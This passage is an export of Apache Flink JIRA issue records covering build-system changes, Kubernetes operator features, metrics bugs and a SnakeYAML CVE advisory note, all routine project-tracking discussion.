Figure 2. Trigger Auto-search after Redirecting from Backpressure Tab",,,,,,,,,,,,,,,,,,,,,,,,,,,,FLINK-29996,,,,"25/May/23 07:52;Yu Chen;image-2023-05-25-15-52-54-383.png;https://issues.apache.org/jira/secure/attachment/13058522/image-2023-05-25-15-52-54-383.png","25/May/23 08:11;Yu Chen;image-2023-05-25-16-11-00-374.png;https://issues.apache.org/jira/secure/attachment/13058523/image-2023-05-25-16-11-00-374.png",,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Jun 05 11:23:24 UTC 2023,,,,,,,,,,"0|z1i4u8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"25/May/23 08:16;Yu Chen;Hi [~yunta], could you help to assign this ticket to me? Thank you~ ;;;","25/May/23 08:41;yunta;[~Yu Chen] Already assigned to you, please go ahead.;;;","05/Jun/23 11:23;yunta;merged in master: a62f2f0f6debe0b2310e379cfaae7c090ec7dbdc
release-1.17: 050db0110c16d404e18649cee0d0e1a7b23f6024;;;",,,,,,,,,,,,,,,,,,,,
Remove M2_HOME usages,FLINK-32185,13537540,13537536,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Invalid,chesnay,chesnay,chesnay,24/May/23 19:58,25/Oct/23 14:03,04/Jun/24 20:41,25/Oct/23 14:03,,,,,,,,,,,,,,,,,,,,,Build System,Build System / CI,,,0,,,,"Apparently M2_HOME is no longer evaluated by Maven, so we either need to adjust some CI stuff or outright remove existing usages.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Oct 25 14:03:36 UTC 2023,,,,,,,,,,"0|z1i4eg:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"25/Oct/23 14:03;chesnay;M2_HOME usages in CI scripts are decoupled from the actual M2_HOME variable, and could be named whatever.
Closing the ticket since there's nothing to be done.;;;",,,,,,,,,,,,,,,,,,,,,,
Use revision version property,FLINK-32184,13537539,13537536,Sub-task,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,chesnay,chesnay,chesnay,24/May/23 19:46,11/Mar/24 12:44,04/Jun/24 20:41,,,,,,,,,,,,,,,,1.20.0,,,,,,Build System,,,,0,,,,"With the revision property we can centrally define the project version in the root pom, and no longer have to change the poms of all modules when creating a release.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Dec 11 12:32:29 UTC 2023,,,,,,,,,,"0|z1i4e8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"11/Dec/23 12:32;Sergey Nuyanzin;[~chesnay] are going to continue here ?

I'm asking since I have a branch with this fix [1]
and it should simplify efforts during releasing/checking release

[1] [https://github.com/snuyanzin/flink/commit/5e74f24ef114d15a8127c08deb711a85638c1c5d]

 ;;;",,,,,,,,,,,,,,,,,,,,,,
Use maven.multiModuleProjectDirectory property instead of rootDir plugin,FLINK-32183,13537538,13537536,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Won't Fix,chesnay,chesnay,chesnay,24/May/23 19:46,25/Oct/23 13:57,04/Jun/24 20:41,25/Oct/23 13:57,,,,,,,,,,,,,,,,,,,,,Build System,,,,0,,,,Drop the now redundant rootDir plugin in favor of a new built-in property.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Oct 25 13:57:17 UTC 2023,,,,,,,,,,"0|z1i4e0:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"25/Oct/23 13:57;chesnay;Maven internal property for which usage is discouraged. Revisit with Maven 4.0 and MNG-7038.;;;",,,,,,,,,,,,,,,,,,,,,,
Use original japicmp plugin,FLINK-32182,13537537,13537536,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,chesnay,chesnay,chesnay,24/May/23 19:45,30/Oct/23 15:29,04/Jun/24 20:41,30/Oct/23 15:29,,,,,,,,,,,,,,,1.19.0,,,,,,Build System,,,,0,pull-request-available,,,"We currently use a japicmp fork for maven 3.2.5 compatibility, then we can now drop.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Oct 30 15:29:51 UTC 2023,,,,,,,,,,"0|z1i4ds:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"30/Oct/23 15:29;chesnay;master: 530ebd2f4ef59f84d2aedaf13a89b030480e3808;;;",,,,,,,,,,,,,,,,,,,,,,
Drop support for Maven 3.2.5,FLINK-32181,13537536,,Technical Debt,In Progress,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,chesnay,chesnay,chesnay,24/May/23 19:44,14/Mar/24 07:36,04/Jun/24 20:41,,,,,,,,,,,,,,,,1.20.0,,,,,,Build System,,,,0,pull-request-available,,,"Collection of improvements we can make when dropping support for Maven 3.2.5.

Targeting 1.19 so we have 3.2.5 as a fallback for the 1.18.0 release.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Dec 13 07:44:56 UTC 2023,,,,,,,,,,"0|z1i4dk:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"30/Oct/23 09:31;chesnay;Enforcing usage of Maven 3.8.6: 
master: 957eaeda496a5a0bc80c86601217a3d643671317;;;","01/Nov/23 12:05;jiabao.sun;Hey, [~chesnay]
Is it not supportive for the version of 3.8.6 above?
I compiled a problem locally by maven 3.9.4.;;;","30/Nov/23 07:00;FrankZou;Hi [~chesnay], I see we enforce Maven 3.8.6 as required version in this ticket, but I do not get why we only support 3.8.6, not all versions newer than 3.8.6?
h1.  ;;;","13/Dec/23 07:44;liming;I also encountered the same problem. Is it necessary to forcefully specify the maven version?;;;",,,,,,,,,,,,,,,,,,,
Move error handling into MultipleComponentLeaderElectionDriverFactory,FLINK-32180,13537532,13432464,Sub-task,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,mapohl,mapohl,mapohl,24/May/23 19:19,20/Jun/23 06:14,04/Jun/24 20:41,20/Jun/23 06:14,,,,,,,,,,,,,,,1.18.0,,,,,,Runtime / Coordination,,,,0,pull-request-available,,,{{LeaderElectionDriverFactory}} allows passing the error handling which can then be used to pass in an error handler that  forwards any error to the contender.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FLINK-32382,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jun 20 06:14:54 UTC 2023,,,,,,,,,,"0|z1i4co:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"20/Jun/23 06:14;mapohl;master: 6a410899e2c57059f9944e8dd35742efa135838e;;;",,,,,,,,,,,,,,,,,,,,,,
Handle more repo names for automatic dist discovery,FLINK-32179,13537531,,Technical Debt,In Progress,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,chesnay,chesnay,chesnay,24/May/23 19:01,14/Mar/24 07:36,04/Jun/24 20:41,,,,,,,,,,,,,,,,1.20.0,,,,,,Test Infrastructure,,,,0,pull-request-available,,,"The e2e tests have a routine to auto-detect the distribution that they need to actually run Flink. When Flink is checked out in a directory not starting with ""flink"" the auto-discovery doesn't find it.
We can improve this slightly by adjusting the iteration condition.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-05-24 19:01:53.0,,,,,,,,,,"0|z1i4cg:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Proposal to set a WEB UI PATH for using AWS ALB INGRESS,FLINK-32178,13537504,,Improvement,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,tanee.kim,tanee.kim,24/May/23 15:04,24/May/23 15:11,04/Jun/24 20:41,,,,,,,,,,,,,,,,,,,,,,Kubernetes Operator,Runtime / Web Frontend,,,1,,,,"Currently, the flink kubernetes operator only supports nginx ingress.

[https://nightlies.apache.org/flink/flink-kubernetes-operator-docs-release-1.5/docs/operations/ingress/]

Many organizations already using the AWS cloud are using the ALB ingress controller and are reluctant to use an additional NGINX ingress controller due to the following issues.
 - Using multiple ingress controllers inherently creates the potential for a race condition.
 - May not match ALB firewall policy (inbound port range)
 - Each change to the EKS cluster needs to reflect the security groups added by ingress

Using AWS Alb isn't impossible, but there is one problem.
Those issues are

If you use domain-based routing, you'll be fine, but it's not going to be popular in organizations with a lot of flink apps.
So you'll want path-based routing, but alb ingress doesn't provide a rewrite-target feature, so if you specify a path based on the app name, you can't change the path to root(/ ) when routing to the service.

In fact, this is a problem that would be solved if AWS ALB INGRESS provided that functionality on their side, but it hasn't happened in a long time.
For more information, see: [https://github.com/kubernetes-sigs/aws-load-balancer-controller/issues/835]

Therefore, I make the following suggestions.
Add a setting that allows you to set the PATH of the FLINK WEB UI directly.
For example, web-ui.path=/flink-app
If we could specify this, then alb ingress would just route the path to the service as is, without using the rewrite-target feature.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-05-24 15:04:47.0,,,,,,,,,,"0|z1i46g:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Refactor MultipleComponentLeaderElectionDriver.Listener.notifyAllKnownLeaderInformation(Collection),FLINK-32177,13537483,13432464,Sub-task,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,mapohl,mapohl,mapohl,24/May/23 13:04,16/Jun/23 15:14,04/Jun/24 20:41,16/Jun/23 15:14,,,,,,,,,,,,,,,1.18.0,,,,,,Runtime / Coordination,,,,0,pull-request-available,,,"We could use {{Map<String, LeaderInformation>}} instead of {{Collection<LeaderInformationWithComponentId>}}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Jun 16 15:14:59 UTC 2023,,,,,,,,,,"0|z1i41s:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"16/Jun/23 15:14;mapohl;master: 201456c5501c5284ceb28197e25e6b248b351025;;;",,,,,,,,,,,,,,,,,,,,,,
[CVE-2022-1471] Mitigate CVE from snakeyaml coming from pulsar-client-all,FLINK-32176,13537468,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Won't Fix,samrat007,samrat007,samrat007,24/May/23 10:47,21/Aug/23 10:22,04/Jun/24 20:41,11/Aug/23 18:08,1.17.0,,,,,,,,,,,,,,,,,,,,Connectors / Pulsar,,,,0,pull-request-available,,," 
 * *CVE ID:* {{CVE-2022-1471}}

 * *CWE:* CWE-502 Deserialization of Untrusted Data

 * {*}Severity{*}: Critical

{{pulsar-client-all-2.10.0.jar (shaded: org.yaml:snakeyaml:1.30)}}

 

{{SnakeYaml's Constructor() class does not restrict types which can be instantiated during deserialization. Deserializing yaml content provided by an attacker can lead to remote code execution. We recommend using SnakeYaml's SafeConsturctor when parsing untrusted content to restrict deserialization.}}

{{}}

{{More details : https://nvd.nist.gov/vuln/detail/CVE-2022-1471}}

{{{}{}}}{{{}{}}}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Aug 11 10:34:58 UTC 2023,,,,,,,,,,"0|z1i3yg:",9223372036854775807,This issue need to be addressed at pulsar end.,,,,,,,,,,,,,,,,,,,"24/May/23 10:47;samrat007;I would like to work on it ;;;","24/May/23 11:09;martijnvisser;[~samrat007] Just to double check, this is only applicable for Pulsar, right?;;;","24/May/23 11:18;samrat007;yes this is only applicable to pulsar only 

```

{{pulsar-client-all-2.10.0.jar (shaded: org.yaml:snakeyaml:1.30)}}

```;;;","27/May/23 03:30;samrat007;Please help triggering the workflow for the PR to complete the tests which needs approval from maintainers/commiter.;;;","11/Aug/23 10:34;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issue is assigned but has not received an update in 30 days, so it has been labeled ""stale-assigned"".
If you are still working on the issue, please remove the label and add a comment updating the community on your progress.  If this issue is waiting on feedback, please consider this a reminder to the committer/reviewer. Flink is a very active project, and so we appreciate your patience.
If you are no longer working on the issue, please unassign yourself so someone else may work on it.
;;;",,,,,,,,,,,,,,,,,,
translate doc(datagen.md) to chinese,FLINK-32175,13537459,,Improvement,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,Fixed,niliushall,niliushall,niliushall,24/May/23 09:44,28/Dec/23 13:13,04/Jun/24 20:41,28/Dec/23 12:17,1.17.0,,,,,,,,,,,,,,,,,,,,chinese-translation,,,,0,chinese-translation,pull-request-available,,Translate doc([https://github.com/niliushall/flink/blob/master/docs/content.zh/docs/connectors/datastream/datagen.md)] into chinese,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,Patch,,,,,,,,9223372036854775807,,,,Wed May 24 09:57:22 UTC 2023,,,,,,,,,,"0|z1i3wg:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"24/May/23 09:57;niliushall;[~will86] Have done. Please review the PR. Thanks. Ref: https://github.com/apache/flink/pull/24006;;;",,,,,,,,,,,,,,,,,,,,,,
Update Cloudera product and link in doc page,FLINK-32174,13537454,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,Fixed,ferenc-csaky,ferenc-csaky,ferenc-csaky,24/May/23 09:19,25/May/23 18:01,04/Jun/24 20:41,25/May/23 18:01,,,,,,,,,,,,,,,1.18.0,,,,,,Documentation,,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu May 25 18:01:49 UTC 2023,,,,,,,,,,"0|z1i3vc:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"25/May/23 18:01;mbalassi;a4de894 in main
fda49dd in release-1.17
6a31cc4 in release-1.16;;;",,,,,,,,,,,,,,,,,,,,,,
Flink Job Metrics returns stale values in the first request after an update in the values,FLINK-32173,13537419,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,prabhujoseph,prabhujoseph,24/May/23 03:05,24/May/23 03:05,04/Jun/24 20:41,,1.17.0,,,,,,,,,,,,,,,,,,,,Runtime / Metrics,,,,0,,,,"Flink Job Metrics returns stale values in the first request after an update in the values.

*Repro:*

1. Run a flink job with fixed strategy and with multiple attempts 
{code}
restart-strategy: fixed-delay
restart-strategy.fixed-delay.attempts: 10000


flink run -Dexecution.checkpointing.interval=""10s"" -d -c org.apache.flink.streaming.examples.wordcount.WordCount /usr/lib/flink/examples/streaming/WordCount.jar
{code}

2. Kill one of the TaskManager which will initiate job restart.

3. After job restarted, fetch any job metrics. The first time it returns stale (older) value 48.

{code}
[hadoop@ip-172-31-44-70 ~]$ curl http://jobmanager:52000/jobs/d24f7d74d541f1215a65395e0ebd898c/metrics?get=numRestarts  | jq .
[
  {
    ""id"": ""numRestarts"",
    ""value"": ""48""
  }
]
{code}

4. On subsequent runs, it returns the correct value.
{code}
[hadoop@ip-172-31-44-70 ~]$ curl http://jobmanager:52000/jobs/d24f7d74d541f1215a65395e0ebd898c/metrics?get=numRestarts  | jq .
[
  {
    ""id"": ""numRestarts"",
    ""value"": ""49""
  }
]
{code}

5. Repeat steps 2 to 5, which will show that the first request after an update to the metrics returns a previous value before the update. Only on the next request is the correct value returned.



",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-05-24 03:05:23.0,,,,,,,,,,"0|z1i3nk:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
KafkaExample can not run with args,FLINK-32172,13537394,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Not a Priority,Fixed,Weijie Guo,xulongfeng2018,xulongfeng2018,23/May/23 23:16,25/May/23 13:05,04/Jun/24 20:41,24/May/23 10:54,1.16.0,,,,,,,,,,,,,,1.16.3,1.17.2,1.18.0,,,,Connectors / Kafka,,,,0,,,,"i fork and clone flink-connector-kafka repo. after build and package, i run org/apache/flink/streaming/kafka/test/KafkaExample.java main() but failed,

comment say:
Example usage: --input-topic test-input --output-topic test-output --bootstrap.servers
* localhost:9092 --group.id myconsumer
 
but console print: Missing parameters!  from KafkaExampleUtil where need 5 paramters but we have 4
 
thank you for your attention to this matter","* win11
 * Git
 * Maven (we recommend version 3.8.6)
 * Java 11",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/May/23 23:16;xulongfeng2018;args.png;https://issues.apache.org/jira/secure/attachment/13058460/args.png","23/May/23 23:16;xulongfeng2018;kafkaexample.png;https://issues.apache.org/jira/secure/attachment/13058459/kafkaexample.png",,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu May 25 08:38:37 UTC 2023,,,,,,,,,,"0|z1i3i0:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"24/May/23 03:31;Weijie Guo;Thanks for the report, this should be an accidental mistake(the minimum parameter count should be 4 instead of 5). It will be fixed asap.;;;","24/May/23 10:58;xulongfeng2018;thanks for your help;;;","25/May/23 08:38;Weijie Guo;master(1.18) via 366d01d08601d8cc42fd3ba74aa754a63503ed34.
release-1.17 via 83da3560584f8d95de0acbe2e922b7f327fec7ec.
release-1.16 via a5851984e9f282897c627a668d1b3d1acf48e50d.
flink-connector-kafka via 224468804f4cfb4a293102b8b596a299463dc077.;;;",,,,,,,,,,,,,,,,,,,,
Add PostStart hook to flink k8s operator helm,FLINK-32171,13537393,,New Feature,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,Fixed,xccui,xccui,xccui,23/May/23 22:56,12/Jun/23 06:24,04/Jun/24 20:41,12/Jun/23 06:24,,,,,,,,,,,,,,,kubernetes-operator-1.6.0,,,,,,Kubernetes Operator,,,,0,pull-request-available,,,I feel it will be convenient to add a PostStart hook optional config to flink k8s operator helm (e.g. when users need to download some Flink plugins).,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Jun 12 06:24:32 UTC 2023,,,,,,,,,,"0|z1i3hs:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"23/May/23 23:02;xccui;Hi [~gyfora], would like to get your thoughts on this. I can work on it if you think this feature is reasonable. Thanks!;;;","24/May/23 07:34;gyfora;I have not used PostStart hooks myself but surely it sounds reasonable. What’s the difference compared to an initcontainer?

you can also go ahead and open a PR with some examples if that would be easiest:);;;","12/Jun/23 06:24;gyfora;merged to main b36fdae98dc075255cb528e87d4960ef46fbfb32;;;",,,,,,,,,,,,,,,,,,,,
Continue metric collection on intermittant job restarts,FLINK-32170,13537374,,Improvement,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,mxm,mxm,23/May/23 17:04,24/May/23 12:59,04/Jun/24 20:41,,,,,,,,,,,,,,,,,,,,,,Autoscaler,Kubernetes Operator,,,0,,,,"If the underlying infrastructure is not stable, e.g. Kubernetes pod eviction, the jobs will sometimes restart. This will restart the metric collection process for the autoscaler and discard any existing metrics. If the interruption time is short, e.g. less than one minute, we could consider resuming metric collection after the job goes back into RUNNING state.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed May 24 12:59:01 UTC 2023,,,,,,,,,,"0|z1i3dk:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"24/May/23 10:48;gyfora;We could generally do this if we can somehow ensure that the configuration / parallelism is etc did not change.;;;","24/May/23 12:59;mxm;Yes, this is the prerequisite. If we kept an in-memory copy of the job topology after the job leaves the RUNNING phase, it should be easy to assert this.;;;",,,,,,,,,,,,,,,,,,,,,
Show allocated slots on TM page,FLINK-32169,13537350,13537340,Sub-task,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,chesnay,chesnay,chesnay,23/May/23 14:25,20/Jul/23 09:06,04/Jun/24 20:41,20/Jul/23 09:05,,,,,,,,,,,,,,,1.18.0,,,,,,Runtime / Coordination,Runtime / Web Frontend,,,0,pull-request-available,,,"Show the allocated slogs on the TM page, so that you can better understand which job is consuming what resources.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Jul 20 09:06:39 UTC 2023,,,,,,,,,,"0|z1i388:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"20/Jul/23 09:05;dmvk;master: acd34941e349cdb513fc41669a298cc1c33cc3ec;;;","20/Jul/23 09:06;dmvk;UI after the change:  !https://user-images.githubusercontent.com/5725237/241916109-650441bb-664d-4e1a-99c9-a53fde4b55b4.png!;;;",,,,,,,,,,,,,,,,,,,,,
Log required/available resources in RM,FLINK-32168,13537343,13537340,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,chesnay,chesnay,chesnay,23/May/23 13:42,25/Jul/23 16:41,04/Jun/24 20:41,25/Jul/23 16:41,,,,,,,,,,,,,,,1.18.0,,,,,,Runtime / Coordination,,,,0,pull-request-available,,,"When matching requirements against available resource the RM currently doesn't log anything apart from whether it could fulfill the resources or not.

We can make the system easier to audit by logging the current requirements, available resources, and how many resources are left after the matching.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jul 25 16:41:50 UTC 2023,,,,,,,,,,"0|z1i36o:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"25/Jul/23 16:41;chesnay;master: dc08df6132921dec0083ebf5a54a66f8447aa2c8;;;",,,,,,,,,,,,,,,,,,,,,,
Log dynamic slot creation on task manager,FLINK-32167,13537342,13537340,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,chesnay,chesnay,chesnay,23/May/23 13:41,24/Jul/23 11:24,04/Jun/24 20:41,24/Jul/23 11:24,,,,,,,,,,,,,,,1.18.0,,,,,,Runtime / Coordination,,,,0,pull-request-available,,,"When a slot is dynamically allocated on the TM we should log that this happens, what resources it consumes and what the remaining resources are.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Jul 24 11:24:45 UTC 2023,,,,,,,,,,"0|z1i36g:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"24/Jul/23 11:24;chesnay;master:
29a5e52dcd6d300c786cf05f3c536ca46364a060
7be5480212cb4df5fe89b8617993680a45c950d2;;;",,,,,,,,,,,,,,,,,,,,,,
Show unassigned/total TM resources in web ui,FLINK-32166,13537341,13537340,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,chesnay,chesnay,chesnay,23/May/23 13:40,30/May/23 09:13,04/Jun/24 20:41,30/May/23 09:13,,,,,,,,,,,,,,,1.18.0,,,,,,Runtime / Web Frontend,,,,0,pull-request-available,,,"It is important to know how many resources of a TM are currently _assigned_ to jobs.
This is different to what resources currently _used_, since you can have assigned 1gb memory to a job with it only using 10mb at this time.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue May 30 09:13:46 UTC 2023,,,,,,,,,,"0|z1i368:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"30/May/23 09:13;chesnay;master: d6c3d332340922c24d1af9dd8835d0bf790184b5;;;",,,,,,,,,,,,,,,,,,,,,,
Improve observability of fine-grained resource management,FLINK-32165,13537340,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,chesnay,chesnay,chesnay,23/May/23 13:37,29/Aug/23 14:38,04/Jun/24 20:41,25/Jul/23 16:41,,,,,,,,,,,,,,,1.18.0,,,,,,Runtime / Coordination,Runtime / Web Frontend,,,0,,,,"Right now fine-grained resource management is way too much of a black-box, with the only source of information being the taskmanager rest endpoints.

While this is fine-ish for services built around it the developer experience is suffering greatly and it becomes impossible to reason about the system afterwards (because we don't even log anything).",,,,,,,,,,,,,,,,,,,,,,,,,,FLINK-32803,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-05-23 13:37:48.0,,,,,,,,,,"0|z1i360:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
LifecycleState count metrics are not reported correctly by namespace,FLINK-32164,13537339,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,nicholasjiang,gyfora,gyfora,23/May/23 13:26,11/Aug/23 06:55,04/Jun/24 20:41,11/Aug/23 06:54,kubernetes-operator-1.4.0,kubernetes-operator-1.5.0,,,,,,,,,,,,,kubernetes-operator-1.7.0,,,,,,Kubernetes Operator,,,,0,pull-request-available,,,"The per namespace lifecycle state count metrics are incorrectly show a global count:

